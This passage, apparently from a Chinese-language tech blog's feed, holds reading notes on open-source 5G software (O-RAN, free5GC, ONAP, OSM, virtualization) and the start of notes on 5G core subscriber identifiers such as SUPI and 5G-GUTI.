應用的延遲和吞吐量需求提供了有效的解決方案。</p><ol><li>由於內容與資料在邊緣被處理，因此資料僅需偶而傳輸至CN，進而使傳輸延遲時間降低，也使CN負擔降低。</li><li>支持本地化服務供應，提供蜂窩網路專網，用於健康、環境監測、邊緣IOT運算…etc</li></ol><h2 id="Intelligence-in-the-network"><a href="#Intelligence-in-the-network" class="headerlink" title="Intelligence in the network"></a>Intelligence in the network</h2><p><code>ML/AI</code><br>資料驅動、自動化的5G網路變成可能，可用不同的use case去訓練並最佳化RAN<br>用例範圍從預測流量需求以擴展 CN 資源 到減少超可靠和低延遲通信 (URLLC) 中的延遲</p><p>而實現這種方案的框架即為O-RAN，透過與gNB,eNB互動的RIC來監控資料、學習與執行閉路驅動。</p><h1 id="The-radio-access-network"><a href="#The-radio-access-network" class="headerlink" title="The radio access network"></a>The radio access network</h1><blockquote><p>這章描述用於部屬4G&#x2F;5G的開源函式庫和框架，細節都可以在專案官網找到，故不贅述</p></blockquote><h3 id="OpenAirInterface"><a href="#OpenAirInterface" class="headerlink" title="OpenAirInterface"></a>OpenAirInterface</h3><p><a href="https://openairinterface.org/">https://openairinterface.org/</a></p><h3 id="srsLTE"><a href="#srsLTE" class="headerlink" title="srsLTE"></a>srsLTE</h3><p><a href="https://www.srslte.com/">https://www.srslte.com/</a></p><h3 id="Radysis-open-source-RAN-contributions"><a href="#Radysis-open-source-RAN-contributions" class="headerlink" title="Radysis open source RAN contributions"></a>Radysis open source RAN contributions</h3><p><a href="https://www.radisys.com/solutions/openran">https://www.radisys.com/solutions/openran</a></p><h1 id="Core-Network"><a href="#Core-Network" class="headerlink" title="Core Network"></a>Core Network</h1><p>此章節闡述針對4、5G的主流開源方案 i.e. EPC, 5G Core</p><h2 id="Evolved-Packet-Core-EPC"><a href="#Evolved-Packet-Core-EPC" class="headerlink" title="Evolved Packet Core (EPC)"></a>Evolved Packet Core (EPC)</h2><p>4G EPC的實現已在 2.1節討論過，通常包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- MME(Mobile Management Entity)</span><br><span class="line">- Home Subscription Server(HSS)</span><br><span class="line">- Service Gateway(SGW)</span><br><span class="line">- Packet Gateway(PGW)</span><br></pre></td></tr></table></figure><p><strong>MME(Mobile Management Gateway)</strong></p><ul><li>與UE建立連接的控制訊息</li><li>尋呼與移動性程序</li><li>NAS信令(signalling)</li><li>安全功能像是追蹤區域列表管理</li><li>PGW&#x2F;SGW選擇</li><li>UE身分認證</li><li>可達性程序</li><li>承載管理(bearer management)<br>i.e. EPC情況下為UE與PGW之間的通道，5GC情況下為UE與UPF之間的通道</li><li>支援EPC與E-UTRAN之間的控制平面信令協定</li><li>可靠的訊息傳輸服務</li><li>支援用於UDP控制訊息的通道協定</li><li>支援用於對UE進行認證、授權、計費的協定</li></ul><p><strong>HSS(Home Subscription Server)</strong></p><ul><li>User Database: 儲存subscriber資料(id 與 key)</li><li>User Authentication</li><li>提供User與MME之間的介面</li></ul><p>SGW與PGW組件通過 <strong><a href="https://zh.wikipedia.org/zh-tw/GPRS%E9%9A%A7%E9%81%93%E5%8D%8F%E8%AE%AE">GTP</a></strong> 為用戶與控制平面傳送資料<br>i.e. GRPS Tunneling Protocol User Plane(GTP-U)、GRPS Tunneling Protocol Control Plane(GTP-C) 並使用UDP作為傳輸層協定</p><div class="note info flat"><p>GTP 5G也有實作，去年被爆出洞<br>　<a href="https://www.ithome.com.tw/news/138340">https://www.ithome.com.tw/news/138340</a><br>　<a href="https://itw01.com/8JS4VEH.html">https://itw01.com/8JS4VEH.html</a></p></div><p>支援Packet Routing和Forwarding，分配IP位址給UE，Paging機制，支援LTE EPC的開源專案有:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- OpenAirInterface(with OAI-CN)</span><br><span class="line">- srsLTE(with srsEPC)</span><br><span class="line">- Open5GS</span><br><span class="line">- Open Mobile Evolved Core(OMEC)</span><br></pre></td></tr></table></figure><p>各開源專案對於EPC各介面實作情況<br><img src="https://i.imgur.com/671qK43.png"></p><h2 id="5G-Core"><a href="#5G-Core" class="headerlink" title="5G Core"></a>5G Core</h2><p><img src="https://i.imgur.com/pZoXlQI.png"></p><p>目前實踐5G核網的開源專案是<strong>Free5GC</strong>，是基於NextEPC(現在的Open5GS)去實作的，<br>提供</p><ul><li>使用者存取、移動性、會話(AMF與SMF)管理</li><li>由其他NF提供的服務發現(Service Discovery)功能  (NRF)</li><li>提供NFs來選擇分配UE的切片 (Network Slice Selection Function)</li><li>管理、儲存、取得使用者資料 (UDM、UDR)</li><li>UE的認證 (AUSF)</li><li>核網的運營與管理 (Operations, Administration and Maintenance (OAM))</li><li>網路編排 …etc</li></ul><p>有被free5gc實作出的3GPP介面:</p><ul><li><strong>N1&#x2F;N2</strong>: 分別連接AMF到UE與RAN，用來進行會話與移動性管理</li><li><strong>N3&#x2F;N4&#x2F;N6</strong>: 分別連接UPF到RAN,SMF,與網路(data network)</li><li><strong>N8</strong>: 連接UDM 與 AMF，進行使用者認證程序</li><li><strong>N10&#x2F;N11</strong>: 分別連接SMF到UDM與AMF，負責處理訂閱及會話管理請求</li><li><strong>N12&#x2F;N13</strong>: 分別連接AUSF到AMF與UDM，它們啟用認證服務</li></ul><h1 id="RAN-and-core-frameworks"><a href="#RAN-and-core-frameworks" class="headerlink" title="RAN and core frameworks"></a>RAN and core frameworks</h1><p>這章描述了多個運用在RAN與核網的<strong>開放框架</strong><br>雖然第三、四章所講的軟體可以執行特定功能，但以下段落所介紹的框架更通用且範圍更廣，並與RAN、CN用於管理、控制與協調</p><p><em>開放框架與架構整理</em><br><img src="https://i.imgur.com/qE16Kyt.png"></p><h2 id="O-RAN"><a href="#O-RAN" class="headerlink" title="O-RAN"></a>O-RAN</h2><p>由O-RAN聯盟所提倡的針對vRAN的開放標準定義，並有兩大目標。<br>第一個是藉由部屬在edge的智慧控制器來整合ML,AI技術<br>第二個是對於開放與敏捷的定義，由RAN的不同元件之間定義明確的介面來實現，<br><strong>由於O-RAN必須公開相同的API，因此很容易將組件替換為其他相同功能的替代組件</strong> 這種作法使5G O-RAN可以整合不同廠商的元件。</p><p><img src="https://i.imgur.com/LP2jmRl.png"></p><h3 id="O-RAN-architecture"><a href="#O-RAN-architecture" class="headerlink" title="O-RAN architecture"></a>O-RAN architecture</h3><p>最頂部的SMO運行著一個non-RT RIC，它以高於1秒的粒度(granularity)執行<strong>控制決定</strong>(control decisions)，它可以提供O-RAN不同功能，例如說可以針對RAN所提供的資料來訓練不同的演算法。</p><p>然而 near-RT RIC，運行著一個<strong>控制迴圈</strong>，並且有著比較密集的時間區間(decision &lt; 10 ms)，會依賴RAN不同的start,stop,override或control 的型別而有所不同 e.g. radio resource management</p><p><strong>這些API可被安裝在near-RT RIC上的應用程式(又稱xApps)來使用</strong><br>而這些xApps可由第三方實體所開發並從公共商店(marketplace)中取得。<br>舉例來說，藉由near-RT RIC和它的xApps，營運商可以控制用戶移動過程(user mobility processes，即 handovers)，根據預測的聯網車輛和無人機的路徑來分配網路資源，執行負載平衡和交通轉向並優化排程策略。near-RT RIC也可以使用在non-RT RIC中所訓練的演算法來做點事。</p><p>O-RAN的其他組件像是CU&#x2F;DU&#x2F;RU，像是5G gNB被拆分成CU&#x2F;DU&#x2F;RU和4G eNB。CU又被進一步拆分成，控制面CU跟用戶面CU。根據3GPP對於不同拆分的定義，O-RAN選擇 <strong>split 7-2x</strong> 作為DU&#x2F;RU的拆分；因此在編碼、調變、和mapping資源都是由DU做的；然和解調變、cyclic prefix addition和digital to analog則是在RU中實現，而precoding則是在兩者中都行。</p><h3 id="O-RAN-interfaces"><a href="#O-RAN-interfaces" class="headerlink" title="O-RAN interfaces"></a>O-RAN interfaces</h3><p>兩個RIC之間的介面為A1介面，而non-RT RIC使用 O1介面與RIC和4G eNB互動</p><ul><li><p>A1介面讓near-RT RIC可提供:</p><ul><li>policy-based guidance to near-RT RIC(以防它偵測到其掏做未實現RAN的效能目標)</li><li>管理ML Model</li><li>向near-RT RIC提供豐富資訊，例如從RAN外部來源，來更進一步精細RAN的優化</li></ul></li><li><p>O1介面，則是具備操作與管理功能，並努力與現有標準兼容來實現與現有框架的完美整合，例如說他仰賴NETCONF或其他3GPP所定義的API。</p></li><li><p>non-RT RIC使用O1介面來:</p><ul><li>供應管理(provision management)</li><li>故障監督(fault supervision)</li><li>效能保證服務 (performance assurance services)</li><li>啟動、註冊和更新實體設備</li><li>管理通訊監控設備</li></ul></li><li><p>near-RT RIC也暴露了E2介面到其他不同元件上(CU,DU,eNB)；這個介面只專注部屬</p><ol><li>near-RT RIC對於E2介面終端節點的控制操作</li><li>管理RIC和這些節點互動行為</li></ol></li><li><p>E1與F1介面符合3GPP的規範。</p></li></ul><p>E1介面跑在控制與用戶面CU之間，它的主要功能是特定UE的trace蒐集與承載建立(bearer setup)和管裡<br>F1介面則是跑在CU與DU之間，它有兩個不同的版本，一個是連接到控制面CU另一個則是用戶面CU；F1負責在CU與DU之間傳送信令(signaling)和資料，以執行<strong>RPC程序</strong> 和<strong>PDCP-RLC交換</strong>。</p><p>最後，與RU之間的介面，則是由O-RAN內部的Open Fronthaul工作組來制定，這個介面攜帶用於data plane的<strong>compressed IQ samples</strong>和用於beamforming和其他物理層程序的控制消息。</p><h3 id="O-RAN-Deployment-Options"><a href="#O-RAN-Deployment-Options" class="headerlink" title="O-RAN Deployment Options"></a>O-RAN Deployment Options</h3><p>O-RAN設想了不同的部屬策略，分別是在區域(regional)或邊緣雲(edge cloud)或者是在營運商擁有的蜂窩基站。每個設施都可以運行O-Cloud，即容器和虛擬機，使用開放介面執行O-RAN程式，<br>或是有個專用的站點使用O-RAN的開放API但可以運行閉源程式碼(closed source code)，兩種情況下圖皆有描述，其描述了6種不同的O-RAN部屬組合</p><p><img src="https://i.imgur.com/dxigwNb.png"></p><p>在 Scenario A，所有元件除了RU以外，都部屬在網路邊緣，共同位於<strong>與fronthaul光纖連接的</strong> 相同的資料中心。</p><p>其他部屬策略是 RIC與CU共同部屬在區域雲設施中，而DU與RU位於網路邊緣或是蜂窩基站上，而首選的部屬策略是 <strong>Scenario B</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RIC在區域雲上</span><br><span class="line">CUs,DUs在edge</span><br><span class="line">只有RU是在營運商的蜂窩基站上</span><br></pre></td></tr></table></figure><h3 id="The-O-RAN-Software-Community"><a href="#The-O-RAN-Software-Community" class="headerlink" title="The O-RAN Software Community"></a>The O-RAN Software Community</h3><p>除了標準化活動，O-RAN也有軟體社群(OSC)，與Linux Foundation合作，貢獻符合O-RAN規範的5G軟體</p><p>第一個版本的釋出是2019的Amber release<br>第二個版本是2020的Bronze release</p><p>這些 release包含了Docker容器和多個O-ran組件的開源軟體:</p><ul><li>non-RT RIC :具有A1介面控制器和管理AI模型的能力</li><li>near-RT RIC 平台: 具有多個應用程序，像是:<ul><li>admission control</li><li>UE manager</li><li>performance and measurement monitor<br>  可藉由E2介面與DU溝通</li></ul></li><li>DU:<ul><li>一個初始版本的fronthaul函式庫</li></ul></li><li>一個用於操作、管理、維護以及虛擬化架構的框架</li><li>simulator:<ul><li>用於測試各個介面</li></ul></li></ul><p>而 cherry release 則是嘗試透過RIC完成不同RAN Component之間的整合。</p><blockquote><p>目前最新發行版為<a href="https://wiki.o-ran-sc.org/display/REL/F+Release">F-Release</a></p></blockquote><p>而 <strong>SD-RAN</strong> 專案也正在領導、開發一項開發工作，目標是實現與O-RAN RIC介面整合的開源規、符合3GPP的RAN。</p><h2 id="Open-Networking-Foundation-frameworks"><a href="#Open-Networking-Foundation-frameworks" class="headerlink" title="Open Networking Foundation frameworks"></a>Open Networking Foundation frameworks</h2><p>由多家電信營運商組成的聯盟，這些運營商提供用於部屬其網路開源程式以及框架<br>包含: OMEC、SD-RAN、ONOS<br>Components Projects 為了特定目的框架與軟體，而Exemplar包含了許多的 Components Projects。</p><h2 id="Other-frameworks-and-projects"><a href="#Other-frameworks-and-projects" class="headerlink" title="Other frameworks and projects"></a>Other frameworks and projects</h2><p>除了O-RAN與ONF方案，許多開源社群也釋出了針對連通性、切片和核心的框架與專案</p><h3 id="5G-EmPOWER"><a href="#5G-EmPOWER" class="headerlink" title="5G-EmPOWER"></a>5G-EmPOWER</h3><p>是一套用於<strong>異構(heterogenous)</strong> RAN架構的作業系統，它由一個開源、可重新程式化的軟體平台組成，該平台將物理基礎設施抽象化，並提供高階API來操控RAN功能。</p><p>5G-EmPOWER 也將控制平面和用戶平面分開，這種分離實際上是由兩個主要組件組成: 一個中央控制器與一組代理。<br><strong>中央控制器:</strong></p><ol><li>作為OS，並且完全了解物理基礎設施功能</li><li>透過OpenEmpower協定來發送控制指令以編排代理的行為</li></ol><p><strong>代理:</strong></p><ol><li>運行在每個網路單元上</li><li>將底層RAN特定的協定(LTE、Wifi)實作 抽象化到控制器</li><li>根據控制器的指令來修改底層協定參數</li></ol><p>5G-EmPOWER目前支援多種無線電存取技術(Radio Access Technologies, RAT)<br>包含LTE、Wifi、LoRa  (5G NR尚未支援)</p><p>此外還有以下專案:</p><ul><li>FlexRAN</li><li>Magma</li><li>LL-MEC</li><li>LightEdge</li><li>OpenRAN (不等於O-RAN Projects)</li><li>Akraino REC</li><li>NVIDIA Aerial</li></ul><h2 id="Open-virtualization-and-management-frameworks"><a href="#Open-virtualization-and-management-frameworks" class="headerlink" title="Open virtualization and management frameworks"></a>Open virtualization and management frameworks</h2><p>除了RAN與CN軟體，虛擬化與管理框架也扮演重要的角色。</p><blockquote><p>ETSI定義了一個NFV MANO框架(Management and Orchestration)應有的共同特徵，主要是為了編排(Orchestrating)網路功能(NF)</p></blockquote><p><img src="https://i.imgur.com/IjG4wat.png"><br><em>上圖指出這些NFV對應在5G生態圈中的哪個部分</em></p><p><strong>NFV Orchestrators</strong> 負責提供網路服務，i.e. 實體及虛擬網路功能(PNF&#x2F;VNF)的結合能夠經由特定的拓樸來連接在一起，來管理它們的生命週期。</p><p>根據 ETSI架構:<br>一個NFV Orchestrator 由下列組成:</p><ol><li>一個管理虛擬化基礎設施(e.g. VIM(Virtualization Infra. Manager)框架，例如OpenStack,Kubernetes,Docker等)的子系統以及與物理硬體的連接</li><li>一個實際的MANO框架</li><li>它所管理的VNFs的集合<br>這些框架有著Northbound、Southbound API來與其它蜂窩網路組件互動<br>本章將會討論虛擬化技術、VIMs，討論受歡迎的 MANO框架像是ONAP、OSM、Open Baton</li></ol><h2 id="Virtualization-techniques"><a href="#Virtualization-techniques" class="headerlink" title="Virtualization techniques"></a>Virtualization techniques</h2><p>NFV將部署在網路中的服務與其運行的硬體基礎設施分離，而應用程式都被包進與硬體分隔虛擬機中，NFV消除了對每個NF對特定硬體的需求，實現網路的可擴增性</p><p><img src="https://i.imgur.com/QBfrv68.png"><br><em>此圖為NFV的高階架構圖，並展示多種實現方式</em></p><h2 id="Traditional-Virtual-Machine"><a href="#Traditional-Virtual-Machine" class="headerlink" title="Traditional Virtual Machine"></a>Traditional Virtual Machine</h2><p>硬體層級虛擬化、提供機器節級別的隔離，透過guest OS與kernel來模擬電腦系統<br>由於VNF有許多硬體虛擬化要求，因此傳統VM被認為是一種資源密集型的作法</p><h2 id="Bare-metal-hypervisors"><a href="#Bare-metal-hypervisors" class="headerlink" title="Bare-metal hypervisors"></a>Bare-metal hypervisors</h2><p>bare-metal hypervisor VM做法與傳統VM做法相近，但這種做法是Hypervisor直接run在主機的硬體上而不需要主機的作業系統，也可用於管理+運行容器或unikernel，而不是整個虛擬機</p><h2 id="Containers"><a href="#Containers" class="headerlink" title="Containers"></a>Containers</h2><p>打包特定程式以及它的dependencies，以虛擬化的方式來run應用程式和服務的虛擬環境<br>容器間彼此分隔，並共享host OS以及對kernel的存取，比起VM，不需要將底部硬體虛擬化，相比來說輕便許多，而容器可被透過與Host OS相接的<strong>容器管理員(container manager)</strong> 來維護<br>或透過Hypervisoer直接跑在裸機Host機器中</p><p>開源容器系統:</p><ul><li><strong>LXC</strong>: 現代容器的主要實踐辦法，透過cgroup與namespaces隔離以創造有獨立網路和process空間的虛擬環境</li><li><strong>Docker</strong>: 允許創造容器，使用OS級別的虛擬化來將他們部屬在機器上，與lxc不同點它將服務、應用、依賴項分解成每個容器內的模組化的單元跟分層，而這些分層可多個容器共享，增加容器映像檔的效率。</li></ul><h3 id="Unikernels"><a href="#Unikernels" class="headerlink" title="Unikernels"></a>Unikernels</h3><p>Unikels是微小、輕量，特製的image，唯一目的是為了run特定的應用程式，他們會將應用服務和其依賴編譯成可執行的虛擬映像檔，過程中不會去包含不必要的組件，因此unikernel能比起傳統容器和VM達到更好的效能；因為unikernel只會包含運行目標應用所必需的軟體元件因此暴露了比較少可能被惡意攻擊的功能，來提高系統的安全性。</p><p>目前已知Unikernel系統: <strong>ClickOS</strong>, <strong>IncludeOS</strong>, <strong>OSv</strong>,<strong>MirageOS</strong>, <strong>Unik</strong></p><p>蜂窩網路相關的Unikernel應用如下:(論文)</p><ul><li>整合Android的函式庫到OSv以降低MCC(Mobile Cloud Computer),MFC(Mobile Fog Computing)行動運算負擔</li><li>基於unikernel的5G網路CDN，如ClickOS,OSv,MirageOS</li><li>其中一篇論文對5g應用實例化為 VNF的IncludeOS unikernel和Docker做效能比較</li></ul><h2 id="Hypervisors"><a href="#Hypervisors" class="headerlink" title="Hypervisors"></a>Hypervisors</h2><p>是一套軟體用來跑虛擬機(guest machines)在實體機器上的(Host Machine)<br>Hypervisor的的關鍵任務是</p><ol><li>在主客體機器間提供虛擬化</li><li>管理客體機器資源的分配與重新分配(CPU,Memory,Storage)</li><li>主客體機器之間的資源調度</li></ol><p>有兩種類別的Hypervisor: Type1 ,Type2<br><strong>Type 1 :</strong>  Hypervioser直接跑在裸機(bare-metal)host機器上，並在host上作為OS<br>Example: Xen, Vmware ESXi<br><strong>Type 2 :</strong>  作為軟體層跑在host OS上<br>Example: Linux Kernel-based VM (KVM),BSD bhyve, Oracle Virtual Box</p><h3 id="Virtualization-infrastrucutre-managers-VIM"><a href="#Virtualization-infrastrucutre-managers-VIM" class="headerlink" title="Virtualization infrastrucutre managers(VIM)"></a>Virtualization infrastrucutre managers(VIM)</h3><p>VIM負責控制與管理NFV基礎設施架構和其資源，像是儲存、計算、網路資源、並在Host硬體上協調客體機器的實例化。<strong>VIM屬於MANO框架的一部分</strong>，框架部分前面提過了</p><p>VIMs的範例有: <strong>OpenStack</strong>、<strong>Kubernetes</strong></p><ul><li><strong>OpenStack</strong>: 一個雲端計算平台，能夠控制大量異構(heterogeneous)資源，像是計算、儲存、網路資源等。在它的眾多功能之中，它可像是VIM一樣，管理網路基礎設施、虛擬機、容器、unikernel、VNF服務和應用</li><li><strong>Kubernetes</strong>: 提供自動化部屬、擴充、管理VM、容器、unikernel、和其應用；透過一系列的物件來抽象化和表達系統的狀態，這些持久性實體描述了在K8S管理的cluster上跑的VNF和應用程式、它們的可用資源以及有關其預期行為的策略。<br>  經過數年也有數個與k8s互動來處理協定層Layer2,Layer3複雜問題的專案，像是<strong>Istio</strong>、<strong>NSM(Network Service Mesh)</strong> 等<ul><li>Istio mesh service: 實作流量管理、策略執行、和遙測收集(telemetry collection)等任務</li><li>NSM:NSM透過Kubernetes API以支援進階使用案例並促進採用新的cloud native方案，並且它也能夠允許網路管理員執行無縫執行任務，像是請求網路介面、添加無線電服務等等</li></ul></li></ul><h2 id="The-Open-Network-Automation-Platform"><a href="#The-Open-Network-Automation-Platform" class="headerlink" title="The Open Network Automation Platform"></a>The Open Network Automation Platform</h2><p>主要是由Linux Foundation開發的一套NFV框架，有許多支援的營運商。<br>OAN被部屬在多個商業蜂窩網路之中，其廠商像是Ericsson,Nokia,Huawai,ZTE這些公司，他們提供ONAP支援並整合進他們的產品。</p><p>ONAP對於商業蜂窩網路中最讚的基於軟體的解決方式。<br>ONAP負責處理大量網路服務的設計、創造和生命週期管理</p><p>網路營運商可用ONAP編排部屬在他們網路中的PNF與VNF。除了NFV orchestrator共同擁有的功能(對於虛擬基礎設施或網路服務使用自動化且基於policy的管理)，ONAP還提供一個<strong>設計框架</strong>來模擬網路應用和服務，以一個<strong>資料分析框架</strong>來監控服務的修復和擴增</p><p>ONAP還提供了許多的參考設計(i.e. blueprint)，可用來為特定場景(5G Networks,VoLTE…etc)部屬部屬ONAP架構，</p><p><img src="https://i.imgur.com/gaDoMDa.png"></p><p>ONAP架構的主要components:</p><ul><li><strong>Management Framework:</strong> 又被稱為<strong>OOM</strong> (ONAP Operations Manager)，負責編排與監控ONAP組件的生命週期，OOM利用K8S和<strong>Consul</strong>來支援服務控制、發現、設定和分段。在它的功能中最值得注意的是<ul><li>Component deployment,dependency manager and configuration</li><li>real-time health monitoring</li><li>service clusteromg and scaling</li><li>component upgrade,restart and deletion</li></ul></li><li><strong>Design Framework</strong>: <ul><li>允許使用宣告式的<strong>模型語言</strong> 來建立網路服務，使得可以指定每個服務的要求和功能。</li><li>它允許通過一組通用規範和策略來對資源、服務、產品及其管理和控制功能進行<strong>建模</strong>。</li><li>它還包括用於系統資產、流程和策略的定義、模擬和認證的服務設計和創建模組。</li><li>模組也提供現有服務的資料庫和用於驗證網路功能的API</li></ul></li><li><strong>Run-time Framework</strong><ul><li>由許多軟體框架組成，用於大多數的管理與編排功能</li><li>當在run-time階段，Micorservices Bus允許由ONAP管理的不同網路功能(NF)之間的訊息與資料通訊及路由</li><li>run-time框架使用自動化的control loop來調度終止微服務，並從平台收集資料和分析資料</li><li>run-time component有公開API、dashboard和cmdline工具，透過一個統一的介面來控制網路基礎施設施</li></ul></li></ul><p>在這些框架底層可以用來與外部控制器、作業系統、雲端環境整合；nothboud API則提供給OSS&#x2F;BSS，大數據及相關服務。</p><h2 id="Integration-with-5G-networks"><a href="#Integration-with-5G-networks" class="headerlink" title="Integration with 5G networks"></a>Integration with 5G networks</h2><p>除了一般的行動網路編排與管理框架，ONAP提供了與5G部屬相關的重要功能<br>通常營運商的主要要求會是需支援hybrid infra</p><ul><li>須包含軟硬體設備</li><li>邊緣自動化，雲須分布在地理位置上不同的邊緣位置</li><li>real-time 分析(須使用自動化的control loop)</li></ul><p>The Frankfurt release (June 2020)與O-RAN整合</p><h2 id="Open-Source-NFV-Management-and-Orchestration"><a href="#Open-Source-NFV-Management-and-Orchestration" class="headerlink" title="Open Source NFV Management and Orchestration"></a>Open Source NFV Management and Orchestration</h2><p>Open Source NFV Management and Orchestration(OSM)是由一堆網路營運商開發的一個MANO框架。<br>與ONAP相似，也被開發及部屬在蜂窩網路之中。</p><p><img src="https://i.imgur.com/rPRGyRL.png"><br><em>OSM的架構圖</em></p><ul><li><strong>The information model</strong>:<br>  將為NF,切片建模為模板，稱為packages，這是由ETSI MANO框架所提供的定義明確的資訊模型來實現的。與ONAP的design components類似，它使電信營運商能夠分析網路需求，並對需要為功能、服務、切片部屬的資源進行建模。</li><li><strong>The OSM Automation Framework</strong>:<br>  它自動化了NF的生命週期，從初始化到擴增到刪除，而這由應用資訊模型到實際部屬的infra上<br>  ，來完成的(可看上圖)，透過自動化框架向不同建模組件公開northbound interface</li></ul><p>與ONAP一樣，OSM southbound norhtbound APIs可公開給外部服務，像是其他編排器和OSS&#x2F;BSS等</p><h1 id="Software-defined-radio-support-for-open-source-radio-units"><a href="#Software-defined-radio-support-for-open-source-radio-units" class="headerlink" title="Software-defined radio support for open source radio units"></a>Software-defined radio support for open source radio units</h1><p>SDR設備<br>USRP、BladeRF、LimeSDR、Iris</p><h1 id="Testbeds"><a href="#Testbeds" class="headerlink" title="Testbeds"></a>Testbeds</h1><p>介紹開源應用、框架、硬體元件用來實例化及軟體化5G網路的測試平台</p><p><img src="https://i.imgur.com/QvOZnqY.png"></p><h1 id="Softwarized-5G-Limitations-and-road-ahead"><a href="#Softwarized-5G-Limitations-and-road-ahead" class="headerlink" title="Softwarized 5G: Limitations and road ahead"></a>Softwarized 5G: Limitations and road ahead</h1><ul><li>Keep pace with the standards</li><li>Latency and scalability issues.</li><li>Limited contributions for RAN open source software</li></ul><div class="note info flat"><p>論文連結: <a href="https://ece.northeastern.edu/wineslab/papers/bonati2020open.pdf">https://ece.northeastern.edu/wineslab/papers/bonati2020open.pdf</a></p></div>]]></content>
      
      
      <categories>
          
          <category> 論文導讀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5G </tag>
            
            <tag> O-RAN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>🧪筆記- 5G 核心網路-移動性管理(Mobile Management)</title>
      <link href="/posts/a05f1769.html"/>
      <url>/posts/a05f1769.html</url>
      
        <content type="html"><![CDATA[<h2 id="用戶標誌與位置標誌"><a href="#用戶標誌與位置標誌" class="headerlink" title="用戶標誌與位置標誌"></a>用戶標誌與位置標誌</h2><p>用戶標誌分為永久標誌與非永久標誌兩種:</p><ul><li><p><strong>永久標誌</strong><br>  一旦用戶綁定便不會修改，具備一定程度的隱私性</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. SUPI</span><br><span class="line">2. 通用公共訂閱標誌(GPSI)</span><br><span class="line">3. 永久設備標誌(PEI)</span><br></pre></td></tr></table></figure></li><li><p><strong>非永久標誌</strong><br>  用於臨時標示用戶，3GPP會不定期更標示符號</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 5G 全球臨時統一標示符(5G-GUTI)</span><br><span class="line">2. SUCI</span><br></pre></td></tr></table></figure><p>位置標誌包含<strong>小區位置跟蹤標誌(TAI)<strong>、</strong>跟蹤區編碼(TAC)</strong></p></li></ul><h3 id="SUPI"><a href="#SUPI" class="headerlink" title="SUPI"></a>SUPI</h3><p>SUPI為永久標誌，5G系統中每個簽約的用戶都會被分配到一個5G SUPI，用於<strong>在3GPP系統中</strong>標示該簽約用戶<br>SUPI標誌存於<strong>UDM&#x2F;UDR(一種NF)</strong> 之中，功能類似4G的IMSI。<br>SUPI可包含IMSI訊息或是用於私有網路的特定網路標誌(network-specific identifier)</p><p>IMSI格式:</p><table><thead><tr><th>封包</th><th>MCC</th><th>MNC</th><th>MSIN</th></tr></thead><tbody><tr><td>長度</td><td>3bit</td><td>2~3bit</td><td>&lt;&#x3D;10bit</td></tr><tr><td></td><td>PLMN</td><td>PLMN</td><td></td></tr></tbody></table><ul><li>In 漫遊場景: SUPI需要攜帶所歸屬網路的地址資訊:MNC、MCC</li><li>若與 EPC Network互通: SUPI總是基於IMSI</li></ul><h3 id="通用公共訂閱標誌-GPSI"><a href="#通用公共訂閱標誌-GPSI" class="headerlink" title="通用公共訂閱標誌 (GPSI)"></a>通用公共訂閱標誌 (GPSI)</h3><p>GPSI為永久標誌，<strong>用於在非3GPP網路之中來標示一個3GPP的簽約</strong><br>GPSI與3GPP的對應關係會儲存在簽約資料中；GPSI在系統內部與外部都可作為公共標誌。<br>GPSI可以是<strong>MSISDN</strong>或其他外部標誌</p><h3 id="永久設備標誌-PEI"><a href="#永久設備標誌-PEI" class="headerlink" title="永久設備標誌(PEI)"></a>永久設備標誌(PEI)</h3><p>PEI為永久標誌，<strong>針對存取5G網路的3GPP UE的標誌</strong><br>不同類型的UE和不同使用場景，PEI可能會有不同格式<br>UE可在發送PEI的同時，攜帶對應 該PEI所使用格式的指令訊息<br>若UE支援至少一種3GPP存取技術，則UE的PEI系需使用IMEI或IMEISV格式</p><h3 id="5G-全球臨時統一標示符-5G-GUTI"><a href="#5G-全球臨時統一標示符-5G-GUTI" class="headerlink" title="5G 全球臨時統一標示符(5G-GUTI)"></a>5G 全球臨時統一標示符(5G-GUTI)</h3><p>5G-GUTI是一個非永久標誌，由AMF為UE臨時分配(於<strong>註冊流程</strong>時分配)的，用於標示該UE<br>使用不同存取方式(3GPP,non-3GPP)，使用相同的5G-GUTI</p><ul><li><p>5G-GUTI的結構:</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;5G-GUTI&gt;:=&lt;GUAMI&gt;&lt;5G-TMSI&gt; (:= 為 &quot; 定義為 &quot; 的符號)</span><br><span class="line">&lt;GUAMI&gt;:用於標示一個或多個AMF</span><br><span class="line">&lt;5G-TMSI&gt;:用於識別唯一的UE</span><br></pre></td></tr></table></figure></li><li><p>GUAMI的結構:</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;GUAMI&gt;:= &lt;MCC&gt;&lt;MNC&gt;&lt;AMF Region ID&gt;&lt;AMF Set ID&gt;&lt;AMF Pointer&gt;</span><br><span class="line"></span><br><span class="line">&lt;AMF Region ID&gt;: 用於標示區域</span><br><span class="line">&lt;AMF Set ID&gt;: 在AMF區域中唯一標示一組AMF</span><br><span class="line">&lt;AMF Pointer&gt;: 在AMF組中唯一標示一個AMF </span><br></pre></td></tr></table></figure></li><li><p>5G-S-TMSI是GUTI的縮短形式，用於無線signalling(尋呼或業務請求流程)提升傳輸效率</p></li><li><p>5G-S-IMSI-結構:</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 